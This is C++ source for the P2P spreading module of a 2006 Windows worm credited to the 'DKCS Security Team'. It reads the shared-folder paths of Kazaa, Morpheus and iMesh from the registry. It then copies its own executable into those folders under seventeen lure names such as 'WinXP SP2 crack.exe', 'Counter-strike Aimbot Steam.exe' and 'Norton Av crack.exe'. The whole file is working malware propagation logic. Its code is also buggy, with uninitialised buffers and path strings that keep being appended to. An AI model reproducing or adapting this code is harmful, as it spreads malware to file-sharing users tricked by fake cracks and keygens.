//-----------------------------------------------------------------
// this file is a part of: DKCS LoadSystem v. 0.1a
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
// Special work for Panda
//-----------------------------------------------------------------
char *p2pnumber = "17";
char *p2pnames[] = {"vb6 crackme.exe",
					"vb6 cdkey gen.exe",
					"MVC++ 6.0 crackme.exe",
					"MVC++ 6.0 cdkey gen.exe",
					"MSDN loader.exe",
					"Opera.exe",
					"IE7.exe",
					"WinXP SP2 crack.exe",
					"PGP serial code.exe",
					"crack.exe",
					"WC3 maphack.exe",
					"D2 lod maphack.exe",
					"Counter-strike Aimbot Steam.exe",
					"Counter-strike cdkey gen.exe",
					"Ut2004 aimbot.exe",
					"Ut 2004 cdkey gen.exe",
					"Norton Av crack.exe"};
//-----------------------------------------------------------------
void Kazaa(void);
void Morpheus(void);
void iMesh(void);
void Copyp2p(char*);
//-----------------------------------------------------------------
DWORD WINAPI P2P_Spreading(LPVOID){
	Kazaa();
	Morpheus();
	iMesh();
	return 1;
}
//-----------------------------------------------------------------
void Kazaa(){
    
	unsigned char *szvalue;
    HKEY hkey;
	DWORD dwSize = sizeof(szvalue);

	RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\KAZAA\\LocalContent", 0, KEY_READ, &hkey);

	if(RegQueryValueEx(hkey, "Dir0", NULL, NULL, szvalue, &dwSize) == ERROR_SUCCESS){
		szvalue[MAX_PATH] += (int)strlen("012345:");
		char *szvalue2 = reinterpret_cast<char *>(szvalue);
		Copyp2p(szvalue2);
	}
	RegCloseKey(hkey);
}
//-----------------------------------------------------------------
void Morpheus(){

	unsigned char *szvalue;
	HKEY hkey;
	DWORD dwSize = sizeof(szvalue);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Morpheus", 0, KEY_READ, &hkey);
	if(RegQueryValueEx(hkey, "Install_Dir", NULL, NULL, szvalue, &dwSize) == ERROR_SUCCESS){
		char *szvalue2 = reinterpret_cast<char *>(szvalue);
		_snprintf(szvalue2, sizeof(szvalue2), "%s\\My Shared Folder", szvalue);
		CreateDirectory(szvalue2, 0);
		Copyp2p(szvalue2);
	}
	RegCloseKey(hkey);
}
//-----------------------------------------------------------------
void iMesh(){

	unsigned char *szvalue;
	HKEY hkey = NULL;
	DWORD dwSize = sizeof(szvalue);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\iMesh\\Client", 0, KEY_READ, &hkey);
	if(RegQueryValueEx(hkey, "DownloadsLocation", NULL, NULL, szvalue, &dwSize) == ERROR_SUCCESS){
		char *szvalue2 = reinterpret_cast<char *>(szvalue);
		Copyp2p(szvalue2);
	}
	RegCloseKey(hkey);
}
//-----------------------------------------------------------------
void Copyp2p(char *p2ppath){

	char filepath[MAX_PATH];
	int p2pnumber2 = atoi(p2pnumber);
	int p2pnumber3 = 0;

	GetModuleFileName(NULL, filepath, MAX_PATH);
	strcat(p2ppath, "\\");
	while(p2pnumber3 != p2pnumber2){
		strcat(p2ppath, p2pnames[p2pnumber3]);
		CopyFile(filepath, p2ppath, FALSE);
		p2pnumber3++;
	}
}
//-----------------------------------------------------------------